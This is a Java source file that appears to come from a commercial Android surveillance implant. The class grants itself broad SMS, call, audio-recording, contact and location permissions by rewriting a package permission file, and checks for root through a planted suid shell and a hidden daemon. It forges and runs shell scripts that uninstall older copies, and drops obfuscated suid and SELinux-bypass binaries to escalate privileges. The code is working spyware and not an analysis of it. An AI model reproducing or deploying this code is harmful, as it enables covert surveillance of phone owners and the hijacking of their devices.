/* *********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 27-jun-2011
 **********************************************/

package com.android.dvci.capabilities;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.Configuration;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.file.AutoFile;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.Utils;
import com.android.mm.M;

import org.xml.sax.SAXException;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import javax.xml.parsers.FactoryConfigurationError;
import javax.xml.parsers.ParserConfigurationException;

public class PackageInfo {
	private static final String TAG = "PackageInfo";

	private static boolean sentInfo;

	private String packageName;
	private FileInputStream fin;
	private XmlParser xml;

	private String requiredPerms[] = StringUtils
			.split(M.e("android.permission.READ_SMS,android.permission.SEND_SMS,android.permission.PROCESS_OUTGOING_CALLS,android.permission.WRITE_EXTERNAL_STORAGE,android.permission.WRITE_SMS,android.permission.ACCESS_WIFI_STATE,android.permission.ACCESS_COARSE_LOCATION,android.permission.RECEIVE_SMS,android.permission.READ_CONTACTS,android.permission.CALL_PHONE,android.permission.READ_PHONE_STATE,android.permission.RECEIVE_BOOT_COMPLETED,android.permission.INTERNET,android.permission.CHANGE_WIFI_STATE,android.permission.ACCESS_FINE_LOCATION,android.permission.WAKE_LOCK,android.permission.RECORD_AUDIO,android.permission.ACCESS_NETWORK_STATE"));

	// XML da parsare
	public PackageInfo(FileInputStream fin, String packageName) throws SAXException, IOException,
			ParserConfigurationException, FactoryConfigurationError {
		this.fin = fin;
		this.packageName = packageName;

		this.xml = new XmlParser(this.fin);
	}

	public String getPackagePath() {
		return this.xml.getPackagePath(this.packageName);
	}

	static public String getPackageName() {
		return Status.getAppContext().getPackageName();
	}

	private ArrayList<String> getPackagePermissions() {
		return this.xml.getPackagePermissions(this.packageName);
	}

	public boolean addRequiredPermissions(String outName) {
		if (this.xml.setPackagePermissions(this.packageName, this.requiredPerms) == false) {
			return false;
		}

		serialize(outName);

		return true;
	}

	private void serialize(String fileName) {
		FileOutputStream fos;

		try {
			fos = Status.getAppContext().openFileOutput(fileName, Context.MODE_WORLD_READABLE);

			String xmlOut = xml.serializeXml();
			fos.write(xmlOut.getBytes());
			fos.close();
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
				Check.log(TAG + " (serialize): Exception during file creation"); //$NON-NLS-1$
			}
		}
	}

	public boolean checkRequiredPermission() {
		boolean permFound = false;
		ArrayList<String> a = getPackagePermissions();

		for (int i = 0; i < this.requiredPerms.length; i++) {
			for (String actualPerms : a) {
				permFound = false;

				if (actualPerms.equals(this.requiredPerms[i]) == true) {
					permFound = true;
					break;
				}
			}

			if (permFound == false) {
				break;
			}
		}

		return permFound;
	}

	static synchronized public boolean checkRoot() { //$NON-NLS-1$
		boolean isRoot = false;

		if (Status.haveRoot()) {
			return true;
		}

		try {
			// Verifichiamo di essere root
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
			}
			final AutoFile file = new AutoFile(Configuration.shellFileBase);

			if (file.exists() && file.canRead()) {
				//todo: check if the daemon (named event_handlerd)is running if not sleep 2 sec for 5 trials
				long start = new Date().getTime();
				while (Utils.pidOf(M.e("event_handlerd")) == null) {
					Check.log(TAG + " (checkRoot): daemon event_handlerd not started");
					Utils.sleep(1000);
					if ((new Date().getTime() - start) > 10000) {
						Check.log(TAG + " (checkRoot): timeout checking event_handlerd expired after " + (new Date().getTime() - start) / 1000 + "sec");
						return isRoot;
					}
				}
				// try at least 2 times sleeping 1 secs
				start = new Date().getTime();
				while (true) {
					isRoot = isRootOk();
					if(isRoot){
						break;
					}else if ((new Date().getTime() - start) > 2000) {
						Check.log(TAG + " (checkRoot): timeout checking root expired after " + (new Date().getTime() - start) / 1000 + "sec");
						break;
					}
					Utils.sleep(1000);
				}
				sentInfo = true;
			}
		} catch (final Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}

		Status.setRoot(isRoot);
		return isRoot;
	}

	public static boolean isRootOk() {
		final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
		String stdout = p.getStdout();
		boolean isRoot = false ;
		if (stdout.startsWith(M.e("uid=0"))) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (isRootOk): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$

				Date timestamp = new Date();
				long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;

				if (!sentInfo) {
					EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
					if (Cfg.DEMO) {
						Status.self().makeToast("Root acquired");
					}
				}

			} else {
				if (!sentInfo) {
					EvidenceBuilder.info(M.e("Root"));
				}
			}

			isRoot = true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (isRootOk): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
			}
			//if (!sentInfo) {
			//	EvidenceBuilder.info("Root: NO");
			//}
		}
		return isRoot;
	}

	static public boolean hasSu() {
		if (checkRootPackages() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (hasSu): checkRootPackages true"); //$NON-NLS-1$
			}
			return true;
		}

		if (checkDebugBuild() == true) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (hasSu): checkDebugBuild true"); //$NON-NLS-1$
			}
			return true;
		}

		return false;
	}

	private static boolean checkRootPackages() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkRootPackages)");
		}
		try {
			// 32_39=/system/app/Superuser.apk
			File file = new File(M.e("/system/app/Superuser.apk"));
			if (file.exists()) {
				return true;
			}

			// 32_40=/data/app/com.noshufou.android.su-1.apk
			file = new File(M.e("/data/app/com.noshufou.android.su-1.apk"));
			if (file.exists()) {
				return true;
			}

			// 32_41=/data/app/com.noshufou.android.su-2.apk
			file = new File(M.e("/data/app/com.noshufou.android.su-2.apk"));
			if (file.exists()) {
				return true;
			}

			// 32_42=/system/bin/su
			file = new File(M.e("/system/bin/su"));
			if (file.exists()) {
				return true;
			}

			// 32_42=/system/bin/su
			file = new File(M.e("/system/xbin/su"));
			if (file.exists()) {
				return true;
			}
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkRootPackages), no root found");
		}
		return false;
	}

	private static boolean checkDebugBuild() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkDebugBuild)");
		}
		String buildTags = android.os.Build.TAGS;

		if (buildTags != null && buildTags.contains(M.e("test-keys"))) {
			return true;
		}

		return false;
	}

	public static boolean removeOldInstall(String ShellFileBase) {
		int uid = android.os.Process.myUid();
		String myName = Status.getAppContext().getPackageName();
		final PackageManager pm = Status.getAppContext().getPackageManager();
		//get a list of installed apps.
		List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
		List<String> apps = new ArrayList<String>();
		//loop through the list of installed packages and see if the selected
		//app is in the list
		for (ApplicationInfo packageInfo : packages) {
			if (packageInfo.uid == uid && !packageInfo.packageName.equalsIgnoreCase(myName)) {
				//get the UID for the selected app
				apps.add(packageInfo.packageName);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (removeOldInstall) found leftover:" + packageInfo.packageName);
				}
			}
		}

		if (!apps.isEmpty()) {
			//forge the script
			String script = M.e("#!/system/bin/sh") + "\n";
			for (String r : apps) {
				if (ShellFileBase != null) {
					script += ShellFileBase + M.e(" qzx ") + M.e("\"pm disable ") + r + "\"\n" +
							ShellFileBase + M.e(" qzx ") + M.e("\"pm uninstall ") + r + "\"\n";
				} else {
					script += M.e("pm disable ") + r + "\n" +
							M.e("pm uninstall ") + r + "\n";
				}
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeOldInstall): script: " + script); //$NON-NLS-1$
			}

			if (Root.createScript("o", script) == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (removeOldInstall): failed to create script"); //$NON-NLS-1$
				}

				return false;
			}
			Execute ex = new Execute();
			ex.execute(Status.getAppContext().getFilesDir() + "/o ");
			Root.removeScript("o");

			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeOldInstall): old app"); //$NON-NLS-1$
			}
			return true;
		}
		return false;
	}

	public static boolean upgradeRoot() {
		final AutoFile file = new AutoFile(Configuration.oldShellFileBase);


		if (file.exists() && file.canRead()) {
//check leftover if any
			removeOldInstall(Configuration.oldShellFileBase);
			try {
				ExecuteResult p = Execute.execute(Configuration.oldShellFileBase + M.e(" qzx id"));
				String stdout = p.getStdout();
				if (stdout.startsWith(M.e("uid=0"))) {

					final File filesPath = Status.getAppContext().getFilesDir();
					final String path = filesPath.getAbsolutePath();

					final String suidext = M.e("ss"); // suidext

					AutoFile dbgd = new AutoFile(M.e("/system/bin/dbgd"));
					if (dbgd.exists()) {
						if (android.os.Build.VERSION.SDK_INT > 20) {
							Utils.dumpAsset(M.e("jbl.data"), suidext);// selinux_suidext Lollipop
						}else {
							Utils.dumpAsset(M.e("jb.data"), suidext);// selinux_suidext
						}
					} else {
						Utils.dumpAsset(M.e("sb.data"), suidext);// suidext
					}

					AutoFile suidextFile = new AutoFile(path + "/" + suidext);
					suidextFile.chmod("755");
					try {
						p = Execute.execute(new String[]{Configuration.oldShellFileBase, "qzx", suidextFile.getFilename() + " rt"});
						stdout = p.getStdout();
						if (Cfg.DEBUG) {
							Check.log(TAG + " (upgradeRoot), result: " + stdout);
						}

					} catch (Exception ex) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (upgradeRoot), ERROR: " + ex);
						}
					} finally {
						suidextFile.delete();
					}

					for (int i = 0; i < 10; i++) {
						Utils.sleep(1000);
						if (checkRoot())
							return true;
					}
				}
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (upgradeRoot), ERROR: " + ex);
				}
			}
		}
		return false;
	}
}
